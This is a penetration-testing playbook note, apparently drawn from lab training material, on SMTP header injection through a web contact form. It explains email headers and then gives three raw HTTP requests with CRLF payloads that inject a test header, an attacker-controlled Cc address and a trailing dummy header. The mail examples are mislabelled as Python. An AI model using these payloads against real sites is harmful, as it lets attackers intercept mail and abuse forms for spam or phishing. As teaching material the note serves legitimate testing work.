---
technique: "SMTP Header injection"
family: "misc"
severity_hint: "medium"
tags: ["SMTP", "EMail"]
source: "_raw/Web attacks/Web Attacks/SMTP Header injection.md"
source_sha256: "b0d461b1e958abdf0f957d055e8f42d434130426ac5057c08208009ba83339bd"
curator_version: 2
review_status: imported-unreviewed
---

# SMTP Header injection

> Family: **misc** · Severity hint: **medium** · Tags: SMTP, EMail
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: From: webmaster@smtpinjection.htb`
- `python: POST /contact.php HTTP/1.1`
- `python: POST /contact.php HTTP/1.1`
- `python: POST /contact.php HTTP/1.1`

## Playbook (operator notes)

# SMTP Header injection

# SMTP Headers

- Email is structured similar to HTTP requests or responses
- Contains a header section which can have special meaning followed by an empty line denoting the body

```python
From: webmaster@smtpinjection.htb
To: admin@smtpinjection.htb
Cc: anotherrecipient@test.htb
Date: Thu, 26 Oct 2006 13:10:50 +0200
Subject: Testmail
  
Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.  
.
```

- `From`: contains the sender
- `To`: contains a single recipient or a list of recipients
- `Subject`: contains the email title
- `Reply-To`: contains the email address the recipient should reply to
- `Cc`: contains recipients that receive a carbon copy of the email
- `Bcc`: contains recipients that receive a blind carbon copy of the email

# Example

# Exploit

```python
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 105
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aTestheader:%20Testvalue&phone=123456789&message=Hello+Admin%21
```

In a real-world deployment of a vulnerable web application, we often do not have access to the resulting email, so we cannot confirm whether our header was successfully injected or not. Our first exploitation attempt could be to add ourselves as a recipient of the email. If we receive the email, we know that we successfully injected an SMTP header. We can do this by targeting one of the following SMTP headers: `To`, `Cc`, or `Bcc`. We can inject our own email address into the header to force the SMTP server to send the email to us:

```python
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 107
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aCc:%20evil@attacker.htb&phone=123456789&message=Hello+Admin%21
```

In some cases, the application might append additional data to our injection point. Consider a scenario where we supply a name and it is reflected in the `Subject` header to form the following line: `You received a message from <name>!`. In this case, an exclamation mark is appended to our input. If we now try to inject a `Cc` header containing our email address, the web application will append the exclamation mark to our email address and thus invalidate it. It is therefore recommended to always inject an additional dummy header after our actual payload to avoid running into such issues. We can do this by specifying an additional line after our payload:

```python
POST /contact.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 151
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil%40attacker.htb%0d%0aCc:%20evil@attacker.htb%0d%0aDummyheader:%20abc&phone=123456789&message=Hello+Admin%21
```

## Source
Original note: `_raw/Web attacks/Web Attacks/SMTP Header injection.md`
